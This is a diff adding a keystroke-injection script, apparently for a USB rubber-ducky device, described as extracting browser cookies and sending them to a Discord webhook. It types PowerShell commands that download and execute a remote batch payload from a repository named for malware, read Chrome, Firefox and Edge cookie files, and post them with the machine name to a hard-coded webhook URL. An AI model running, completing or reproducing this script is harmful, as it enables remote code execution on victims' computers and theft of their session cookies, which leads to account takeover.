@@ -1,0 +1,48 @@
+REM Title: all i need 
+REM Description: can Extracts cookies from popular browsers and sends them to a Discord webhook.
+WINDOWS R
+DELAY 2000
+TYPE powershell -Command "& {iwr -useb 'https://raw.githubusercontent.com/kaminarinokoky/malware-and-school-hacking-project/refs/heads/main/payload.bat' | iex}"
+ENTER
+DELAY 2000
+WINDOWS R
+DELAY 2000
+TYPE powershell -Command "& {iwr -useb 'https://raw.githubusercontent.com/kaminarinokoky/malware-and-school-hacking-project/refs/heads/main/payload.bat' | iex}"
+ENTER
+DELAY 2000
+
+
+SET WEBHOOK := "https://discord.com/api/webhooks/1326164102430724161/wA73oSHytoHTie7FnbZCz4tetoE-AJkvemVg_JqZfrSObQHJfTFBnOA_4XRbIenjYUxi"
+
+
+SET CHROME_PATH := "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Cookies"
+SET FIREFOX_PATH := "%USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles\*.default\cookies.sqlite"
+SET EDGE_PATH := "%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Default\Cookies"
+
+
+STRING powershell -Command "& {Get-Content -Path '%CHROME_PATH%' -Encoding UTF8 | Select-String -Pattern ' cookie '}"
+ENTER
+SLEEP 2000
+TYPE powershell -Command "& {$cookies = Get-Content -Path '%CHROME_PATH%' -Encoding UTF8 | Select-String -Pattern ' cookie '; $cookies | ForEach-Object {$_ -replace ' cookie ', ''} | Set-Content -Path '%TEMP%\chrome_cookies.txt'}"
+ENTER
+SLEEP 2000
+
+
+STRING powershell -Command "& {Get-Content -Path '%FIREFOX_PATH%' -Encoding UTF8 | Select-String -Pattern ' cookie '}"
+ENTER
+SLEEP 2000
+TYPE powershell -Command "& {$cookies = Get-Content -Path '%FIREFOX_PATH%' -Encoding UTF8 | Select-String -Pattern ' cookie '; $cookies | ForEach-Object {$_ -replace ' cookie ', ''} | Set-Content -Path '%TEMP%\firefox_cookies.txt'}"
+ENTER
+SLEEP 2000
+
+
+STRING powershell -Command "& {Get-Content -Path '%EDGE_PATH%' -Encoding UTF8 | Select-String -Pattern ' cookie '}"
+ENTER
+SLEEP 2000
+TYPE powershell -Command "& {$cookies = Get-Content -Path '%EDGE_PATH%' -Encoding UTF8 | Select-String -Pattern ' cookie '; $cookies | ForEach-Object {$_ -replace ' cookie ', ''} | Set-Content -Path '%TEMP%\edge_cookies.txt'}"
+ENTER
+SLEEP 2000
+
+
+STRING powershell -Command "& {Invoke-WebRequest -Uri '%WEBHOOK%' -Method POST -Body '{\"content\":\"Cookies from %COMPUTERNAME%:\\n\\nChrome:\\n\" + (Get-Content -Path \"%TEMP%\\chrome_cookies.txt\") + \"\\n\\nFirefox:\\n\" + (Get-Content -Path \"%TEMP%\\firefox_cookies.txt\") + \"\\n\\nEdge:\\n\" + (Get-Content -Path \"%TEMP%\\edge_cookies.txt\")}'}"
+ENTER
